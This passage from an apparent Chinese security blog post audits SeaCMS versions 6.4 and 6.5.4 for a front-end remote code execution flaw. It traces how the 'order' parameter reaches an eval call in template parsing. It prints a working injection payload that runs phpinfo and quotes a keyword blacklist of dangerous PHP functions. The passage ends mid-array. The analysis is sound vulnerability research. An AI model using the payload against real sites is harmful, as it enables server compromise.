是输出文件页面的大小，默认在缓存文件里面保存，值为24.</p>\n<p>由于其他相关参数都为空，我们直接跟进到文件的第 145 行，来查看模板文件的处理方式。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>($cfg_iscache)&#123;<br>\t\t<span class=\"hljs-keyword\">if</span>(chkFileCache($cacheName))&#123;<br>\t\t\t$content = getFileCache($cacheName);<br>\t\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t\t$content = parseSearchPart($searchTemplatePath);<br>\t\t\tsetFileCache($cacheName,$content);<br>\t\t&#125;<br>\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t\t$content = parseSearchPart($searchTemplatePath);<br>\t&#125;<br></code></pre></td></tr></table></figure>\n\n<p>变量 $cfg_iscache 默认传入为 1，所以我们跟进到 <strong>chkFileCache()</strong>函数里面。</p>\n<ul>\n<li>文件 /upload/include/inc/common_func.php</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">chkFileCache</span><span class=\"hljs-params\">($cacheName)</span><br></span>&#123;<br>\t<span class=\"hljs-keyword\">global</span> $cfg_cachetime,$cfg_cachemark;<br>\t$cacheFile=sea_ROOT.<span class=\"hljs-string\">'/data/cache/'</span>.$cfg_cachemark.$cacheName.<span class=\"hljs-string\">'.inc'</span>;<br>\t$mintime = time() - $cfg_cachetime*<span class=\"hljs-number\">60</span>;<br>\t<span class=\"hljs-keyword\">if</span>(!file_exists($cacheFile) || ( file_exists($cacheFile) &amp;&amp; ($mintime &gt; filemtime($cacheFile))))&#123;<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>;<br>\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">true</span>;<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>这里的逻辑理解的关键点就在这句</p>\n<p><code>if(!file_exists($cacheFile) || ( file_exists($cacheFile) &amp;&amp; ($mintime &gt; filemtime($cacheFile))))</code></p>\n<p>我们在这设一个 $test 变量 </p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1564321031968\"></p>\n<p>看到这里是返回 false 的，由格式来看，只能是两边的判断式都为假时，最终的布尔值才会为假。所以，file_exists($cacheFile) 是成立的，也就是说，文件<code>D:/WWW/seacms_v6.4/upload/data/cache/E20121213155816parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_.inc</code> 存在。但实际上从本地来看，这个文件并不存在，只有一个相似的被截断的文件名 <code>E20121213155816parse_cascade_0_0_0_0_}{end if} {if</code> 存在，这是因为出现的 if 后面的冒号将文件名截断。但是 file_exists 函数仍然判断源文件存在。这想来是件很有趣的事情啊，这就引出来对 file_exists() 与 文件关系的讨论。</p>\n<h5 id=\"1-2-1-有趣的-file-exists-和-ntfs-文件系统\"><a href=\"#1-2-1-有趣的-file-exists-和-ntfs-文件系统\" class=\"headerlink\" title=\"1.2.1 有趣的 file_exists()  和 ntfs 文件系统\"></a>1.2.1 有趣的 file_exists()  和 ntfs 文件系统</h5><p>除了上面的那个情况外，还有一个点也能证明这个被截断文件名的文件是真实存在的。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1564363773307\"></p>\n<p>思考一下：是否存在这种情况，操作系统的文件系统将文件写入的数据流保存到一个位置，但是显示的文件名是以它的命名规则显示，而真正的文件名是与写入数据流相互关联，可以用底层的编程语言打开那个完整文件名的文件，获取数据流？</p>\n<p>搜索无果后，在 p 神小密圈发问，得到了师傅们的指导，了解了一下 ntfs 文件系统。</p>\n<p>更多关于 ntfs 文件系统中的隐藏流的知识，请见我的另一篇博客：<a href=\"https://www.59wlx.top/2019/08/17/ntfs%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84ADS%E4%BE%9B%E9%80%89%E6%95%B0%E6%8D%AE%E6%B5%81/\" target=\"_blank\" rel=\"noopener\">ntfs 系统中的ADS供选数据流</a></p>\n<h5 id=\"1-2-2-继续跟踪审计\"><a href=\"#1-2-2-继续跟踪审计\" class=\"headerlink\" title=\"1.2.2 继续跟踪审计\"></a>1.2.2 继续跟踪审计</h5><p>好了，解决完上面的问题，我们接着来看审计。</p>\n<p>当我们第一次构造 payload 进行访问时，是不存在那个模板文件的，那么代码会走到另一个分支。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>($cfg_iscache)&#123;<br>\t\t<span class=\"hljs-keyword\">if</span>(chkFileCache($cacheName))&#123;<br>\t\t\t$content = getFileCache($cacheName);<br>\t\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t\t$content = parseSearchPart($searchTemplatePath);<br>\t\t\tsetFileCache($cacheName,$content);<br>\t\t&#125;<br>\t&#125;<br></code></pre></td></tr></table></figure>\n\n<p>在 chkFileCache() 函数返回 false 后，进入到 else 分支 ,执行获取 $content, 并对搜索的不存在模板文件进行写入。这也是我们之后访问那个模板文件中内容的由来，即可以一次或多次执行 phpinfo()。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">parseSearchPart</span><span class=\"hljs-params\">($templatePath)</span><br></span>&#123;<br>\t<span class=\"hljs-keyword\">global</span> $mainClassObj,$tid;<br>\t$currentTypeId = <span class=\"hljs-keyword\">empty</span>($tid)?<span class=\"hljs-number\">0</span>:$tid;<br>\t$content=loadFile(sea_ROOT.$templatePath);<br>\t$content=$mainClassObj-&gt;parseTopAndFoot($content);<br>\t$content=$mainClassObj-&gt;parseAreaList($content);<br>\t$content=$mainClassObj-&gt;parseHistory($content);<br>\t$content=$mainClassObj-&gt;parseSelf($content);<br>\t$content=$mainClassObj-&gt;parseGlobal($content);<br>\t$content=$mainClassObj-&gt;parseMenuList($content,<span class=\"hljs-string\">\"\"</span>,$currentTypeId);<br>\t$content=$mainClassObj-&gt;parseVideoList($content,$currentTypeId);<br>\t$content=$mainClassObj-&gt;parsenewsList($content,$currentTypeId);<br>\t$content=$mainClassObj-&gt;parseTopicList($content);<br>\t<span class=\"hljs-keyword\">return</span> $content;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>这个函数获取模板文件的默认格式，然后进行替换赋值。</p>\n<p>之后就进入到了关键的模板内容替换的部分：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">$content = str_replace(<span class=\"hljs-string\">\"&#123;searchpage:page&#125;\"</span>,$page,$content);<br>\t<span class=\"hljs-keyword\">echo</span> $content;<br>\t$content = str_replace(<span class=\"hljs-string\">\"&#123;seacms:searchword&#125;\"</span>,$searchword,$content);<br>\t$content = str_replace(<span class=\"hljs-string\">\"&#123;seacms:searchnum&#125;\"</span>,$TotalResult,$content);<br>\t$content = str_replace(<span class=\"hljs-string\">\"&#123;searchpage:ordername&#125;\"</span>,$order,$content);<br>......<br></code></pre></td></tr></table></figure>\n\n<p>我只列出我们可控的部分，关键就在 $order 这个参数，我们结合 $content 获取到的模板文件的内容，来观察替换后的亚子。模板内容如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"&#123;searchpage:order-time-link&#125;\"</span> &#123;<span class=\"hljs-attr\">if:</span>\"&#123;<span class=\"hljs-attr\">searchpage:ordername</span>&#125;\"==<span class=\"hljs-string\">\"time\"</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-success\"</span> &#123;<span class=\"hljs-attr\">else</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-default\"</span> &#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125; <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"orderhits\"</span>&gt;</span>最新上映<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"&#123;searchpage:order-hit-link&#125;\"</span> &#123;<span class=\"hljs-attr\">if:</span>\"&#123;<span class=\"hljs-attr\">searchpage:ordername</span>&#125;\"==<span class=\"hljs-string\">\"hit\"</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-success\"</span> &#123;<span class=\"hljs-attr\">else</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-default\"</span> &#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125; <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"orderaddtime\"</span>&gt;</span>最近热播<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"&#123;searchpage:order-score-link&#125;\"</span> &#123;<span class=\"hljs-attr\">if:</span>\"&#123;<span class=\"hljs-attr\">searchpage:ordername</span>&#125;\"==<span class=\"hljs-string\">\"score\"</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-success\"</span> &#123;<span class=\"hljs-attr\">else</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-default\"</span> &#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125; <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"ordergold\"</span>&gt;</span>评分最高<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>可以看到，模板文件中有3次出现 ordername，这也就可以解释为什么 payload 触发漏洞之后，执行了三次 phpifno()</p>\n<p>结合我们的 payload，我们可以知道模板文件替换位置最终的形式如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"&#123;searchpage:order-time-link&#125;\"</span> &#123;<span class=\"hljs-attr\">if:</span>\"&#125;&#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125;&#123;<span class=\"hljs-attr\">if:1</span>)<span class=\"hljs-attr\">phpinfo</span>();<span class=\"hljs-attr\">if</span>(<span class=\"hljs-attr\">1</span>&#125;&#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125;\"==<span class=\"hljs-string\">\"time\"</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-success\"</span> &#123;<span class=\"hljs-attr\">else</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-default\"</span> &#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125; <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"orderhits\"</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>这里的 <code>}</code>,作用就是在 eval 的时候保证逻辑与语法的正确性，保证之后的代码可以被正确执行。</p>\n<p>模板文件内容替换后，进入到最最关键的一步：</p>\n<p><code>$content=$mainClassObj-&gt;parseIf($content);</code></p>\n<p>跟进到 parseIf 函数：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">parseIf</span><span class=\"hljs-params\">($content)</span></span>&#123;<br>\t\t<span class=\"hljs-keyword\">if</span> (strpos($content,<span class=\"hljs-string\">'&#123;if:'</span>)=== <span class=\"hljs-keyword\">false</span>)&#123;<br>\t\t<span class=\"hljs-keyword\">return</span> $content;<br>\t\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t<span class=\"hljs-comment\">// echo $content;</span><br>\t\t$labelRule = buildregx(<span class=\"hljs-string\">\"&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;\"</span>,<span class=\"hljs-string\">\"is\"</span>);<br>\t\t$labelRule2=<span class=\"hljs-string\">\"&#123;elseif\"</span>;<br>\t\t$labelRule3=<span class=\"hljs-string\">\"&#123;else&#125;\"</span>;<br>\t\tpreg_match_all($labelRule,$content,$iar);<br>\t\t$arlen=count($iar[<span class=\"hljs-number\">0</span>]);<br>\t\t<span class=\"hljs-comment\">// var_dump($iar[0]);</span><br>\t\t$elseIfFlag=<span class=\"hljs-keyword\">false</span>;<br>\t\t<span class=\"hljs-keyword\">for</span>($m=<span class=\"hljs-number\">0</span>;$m&lt;$arlen;$m++)&#123;<br>\t\t\t$strIf=$iar[<span class=\"hljs-number\">1</span>][$m];<br>\t\t\t$strIf=<span class=\"hljs-keyword\">$this</span>-&gt;parseStrIf($strIf);<br>\t\t\t$strThen=$iar[<span class=\"hljs-number\">2</span>][$m];<br>\t\t\t$strThen=<span class=\"hljs-keyword\">$this</span>-&gt;parseSubIf($strThen);<br>\t\t\t<span class=\"hljs-keyword\">if</span> (strpos($strThen,$labelRule2)===<span class=\"hljs-keyword\">false</span>)&#123;<br>\t\t\t\t<span class=\"hljs-keyword\">if</span> (strpos($strThen,$labelRule3)&gt;=<span class=\"hljs-number\">0</span>)&#123;<br>\t\t\t\t\t$elsearray=explode($labelRule3,$strThen);<br>\t\t\t\t\t$strThen1=$elsearray[<span class=\"hljs-number\">0</span>];<br>\t\t\t\t\t$strElse1=$elsearray[<span class=\"hljs-number\">1</span>];<br>\t\t\t\t\t@<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">\"if(\"</span>.$strIf.<span class=\"hljs-string\">\")&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;\"</span>);<br></code></pre></td></tr></table></figure>\n\n<p>由正则式可知 $iar[0] 数组得到的是所有满足 <code>{if:【内容】}【内容】{end if}</code> 这种形式的匹配结果</p>\n<p>回头来看看我们刚刚替换后的关键部分的模板内容：</p>\n<p><code>&lt;a href=&quot;{searchpage:order-time-link}&quot; {if:&quot;}{end if}{if:1)phpinfo();if(1}{end if}&quot;==&quot;time&quot;}</code></p>\n<p>是满足匹配规则的，重要内容保存在 $iar[1]中。这里我们直接定位到最终执行 payload 的语句中。</p>\n<p><code>@eval(&quot;if(&quot;.$strIf.&quot;){\\$ifFlag=true;}else{\\$ifFlag=false;}&quot;);</code></p>\n<p>跟踪 $strIf 变量，经过了两次处理</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">$strIf=$iar[<span class=\"hljs-number\">1</span>][$m];<br>$strIf=<span class=\"hljs-keyword\">$this</span>-&gt;parseStrIf($strIf);<br></code></pre></td></tr></table></figure>\n\n<p>上面说过，最终的 payload 关键内容会保存在 $iar[1] 中，所以经过 for 遍历，$strIf 一定可以被赋值为带有 phpinfo() 的字符串。</p>\n<p>跟进到 parseStrIf() 函数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">parseStrIf</span><span class=\"hljs-params\">($strIf)</span><br></span>&#123;<br>\t<span class=\"hljs-keyword\">if</span>(strpos($strIf,<span class=\"hljs-string\">'='</span>)===<span class=\"hljs-keyword\">false</span>)<br>\t&#123;<br>\t\t<span class=\"hljs-keyword\">return</span> $strIf;<br>\t&#125;<br>\t<span class=\"hljs-keyword\">if</span>((strpos($strIf,<span class=\"hljs-string\">'=='</span>)===<span class=\"hljs-keyword\">false</span>)&amp;&amp;(strpos($strIf,<span class=\"hljs-string\">'='</span>)&gt;<span class=\"hljs-number\">0</span>))<br>\t&#123;<br>\t\t$strIf=str_replace(<span class=\"hljs-string\">'='</span>, <span class=\"hljs-string\">'=='</span>, $strIf);<br>\t&#125;<br>\t$strIfArr =  explode(<span class=\"hljs-string\">'=='</span>,$strIf);<br>\t<span class=\"hljs-keyword\">return</span> (<span class=\"hljs-keyword\">empty</span>($strIfArr[<span class=\"hljs-number\">0</span>])?<span class=\"hljs-string\">'NULL'</span>:$strIfArr[<span class=\"hljs-number\">0</span>]).<span class=\"hljs-string\">\"==\"</span>.(<span class=\"hljs-keyword\">empty</span>($strIfArr[<span class=\"hljs-number\">1</span>])?<span class=\"hljs-string\">'NULL'</span>:$strIfArr[<span class=\"hljs-number\">1</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>当下我们的 $strIf 为 <code>1)phpinfo();if(1</code></p>\n<p>其中没有 <strong>=</strong> ，所以直接返回原内容。所以最后 eval() 函数执行的内容就为</p>\n<p><code>@eval(&quot;if(1)phpinfo();if(1){\\$ifFlag=true;}else{\\$ifFlag=false;}&quot;);</code></p>\n<p>代码就会顺利得到执行。</p>\n<p>这里纠正一下引用文章的一个说法，<code>$labelRule = buildregx(&quot;{if:(.*?)}(.*?){end if}&quot;,&quot;is&quot;);</code></p>\n<p>这个正则式并不是贪婪匹配，而是使用  <strong>？</strong> 来取消了贪婪匹配。每次只匹配一个结果，并不向后延伸，而匹配到所有结果是函数 <strong>preg_match_all()</strong> 的作用。</p>\n<h4 id=\"1-2-结果分析\"><a href=\"#1-2-结果分析\" class=\"headerlink\" title=\"1.2 结果分析\"></a>1.2 结果分析</h4><p>这个漏洞利用的十分巧妙。先利用可控变量替换模板中的内容，然后进行模板内容提取，最后正则匹配执行代码。但是说到底，挖掘漏洞的人肯定也是从 eval() 这个危险函数出发，逐步回退，找到可控参数，然后一步步的构造payload，这是典型的一个白盒挖掘漏洞的思路，<code>回溯参数</code>的方法。</p>\n<p>但是 php7 版本以上此漏洞却不能利用，原因是之前匹配到的 <code>&quot;</code> 使得 eval() 函数不能正确执行，导致后面的代码停止执行。</p>\n<p>测试代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>$test = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-string\">'\"'</span>,<span class=\"hljs-string\">\"1)phpinfo();if(1\"</span>);<br><span class=\"hljs-keyword\">for</span> ($i=<span class=\"hljs-number\">0</span>;$i&lt;<span class=\"hljs-number\">5</span>;$i++)&#123;<br>    @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">\"if(\"</span>.$test[$i].<span class=\"hljs-string\">\") &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;\"</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>php5 下的执行结果</p>\n<p>  <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/4.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt></p>\n<p>php7 下的执行结果</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt></p>\n<p>可以看出，单从 eval() 函数的使用上来说，php7 对于语法的正确性要求更加严格。</p>\n<h3 id=\"2、v-6-5-4-前台-getshell\"><a href=\"#2、v-6-5-4-前台-getshell\" class=\"headerlink\" title=\"2、v_6.5.4 前台 getshell\"></a>2、v_6.5.4 前台 getshell</h3><p>在这个版本的代码中，将上面讲到的 <strong>$order</strong> 变量也进行了特殊字符的检测 </p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"6\"></p>\n<p>跟进到 RemoveXSS 函数里面，可以看出是一个基于黑名单的 xss 关键字过滤的方法。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">RemoveXSS</span><span class=\"hljs-params\">($val)</span> </span>&#123;  <br><br>   $val = preg_replace(<span class=\"hljs-string\">'/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/'</span>, <span class=\"hljs-string\">''</span>, $val);  <br>  <br>   $search = <span class=\"hljs-string\">'abcdefghijklmnopqrstuvwxyz'</span>; <br>   $search .= <span class=\"hljs-string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;  <br>   $search .= <span class=\"hljs-string\">'1234567890!@#$%^&amp;*()'</span>; <br>   $search .= <span class=\"hljs-string\">'~`\";:?+/=&#123;&#125;[]-_|\\'\\\\'</span>; <br>   <span class=\"hljs-keyword\">for</span> ($i = <span class=\"hljs-number\">0</span>; $i &lt; strlen($search); $i++) &#123; <br> <br>      $val = preg_replace(<span class=\"hljs-string\">'/(&amp;#[xX]0&#123;0,8&#125;'</span>.dechex(ord($search[$i])).<span class=\"hljs-string\">';?)/i'</span>, $search[$i], $val); <br>      $val = preg_replace(<span class=\"hljs-string\">'/(&amp;#0&#123;0,8&#125;'</span>.ord($search[$i]).<span class=\"hljs-string\">';?)/'</span>, $search[$i], $val); <span class=\"hljs-comment\">// with a ; </span><br>   &#125; <br>   <br>   $ra1 = <span class=\"hljs-keyword\">Array</span>(<span class=\"hljs-string\">'_GET'</span>,<span class=\"hljs-string\">'_POST'</span>,<span class=\"hljs-string\">'_COOKIE'</span>,<span class=\"hljs-string\">'_REQUEST'</span>,<span class=\"hljs-string\">'if:'</span>,<span class=\"hljs-string\">'javascript'</span>, <span class=\"hljs-string\">'vbscript'</span>, <span class=\"hljs-string\">'expression'</span>, <span class=\"hljs-string\">'applet'</span>, <span class=\"hljs-string\">'meta'</span>, <span class=\"hljs-string\">'xml'</span>, <span class=\"hljs-string\">'blink'</span>, <span class=\"hljs-string\">'link'</span>, <span class=\"hljs-string\">'style'</span>, <span class=\"hljs-string\">'script'</span>, <span class=\"hljs-string\">'embed'</span>, <span class=\"hljs-string\">'object'</span>, <span class=\"hljs-string\">'iframe'</span>, <span class=\"hljs-string\">'frame'</span>, <span class=\"hljs-string\">'frameset'</span>, <span class=\"hljs-string\">'ilayer'</span>, <span class=\"hljs-string\">'layer'</span>, <span class=\"hljs-string\">'bgsound'</span>, <span class=\"hljs-string\">'title'</span>, <span class=\"hljs-string\">'base'</span>, <span class=\"hljs-string\">'eval'</span>, <span class=\"hljs-string\">'passthru'</span>, <span class=\"hljs-string\">'exec'</span>, <span class=\"hljs-string\">'assert'</span>, <span class=\"hljs-string\">'system'</span>, <span class=\"hljs-string\">'chroot'</span>, <span class=\"hljs-string\">'chgrp'</span>, <span class=\"hljs-string\">'chown'</span>, <span class=\"hljs-string\">'shell_exec'</span>, <span class=\"hljs-string\">'proc_open'</span>, <span class=\"hljs-string\">'ini_restore'</span>, <span class=\"hljs-string\">'dl'</span>, <span class=\"hljs-string\">'readlink'</span>, <span class=\"hljs-string\">'symlink'</span>, <span class=\"hljs-string\">'popen'</span>, <span class=\"hljs-string\">'stream_socket_server'</span>, <span class=\"hljs-string\">'pfsockopen'</span>, <span class=\"hljs-string\">'putenv'</span>, <span class=\"hljs-string\">'cmd'</span>,<span class=\"hljs-string\">'base64_decode'</span>,<span class=\"hljs-string\">'fopen'</span>,<span class=\"hljs-string\">'fputs'</span>,<span class=\"hljs-string\">'replace'</span>,<span class=\"hljs-string\">'input'</span>,<span class=\"hljs-string\">'contents'</span>); <br>   $ra2 = <span class=\"hljs-keyword\">Array</span>(<span class=\"hljs-string\">'onabort'</span>, <span class=\"hljs-string\">'onactivate'</span>, <span class=\"hljs-string\">'onafterprint'</span>, <span class=\"hljs-string\">'onafterupdate'</span>, <span class=\"hljs-string\">'onbeforeactivate'</span>, <span class=\"hljs-string\">'onbeforecopy'</span>, <span class=\"hljs-string\">'onbeforecut'</span>, <span class=\"hljs-string\">'onbeforedeactivate'</span>, <span class=\"hljs-string\">'onbeforeeditfocus'</span>, <span class=\"hljs-string\">'onbeforepaste'</span>, <span class=\"hljs-string\">'onbeforeprint'</span>, <span class=\"hljs-string\">'onbeforeunload'</span>, <span class=\"hljs-string\">'onbeforeupdate'</span>, <span class=\"hljs-string\">'onblur'</span>, <span class=\"hljs-string\">'onbounce'</span>, <span class=\"hljs-string\">'oncellchange'</span>, <span class=\"hljs-string\">'onchange'</span>, <span 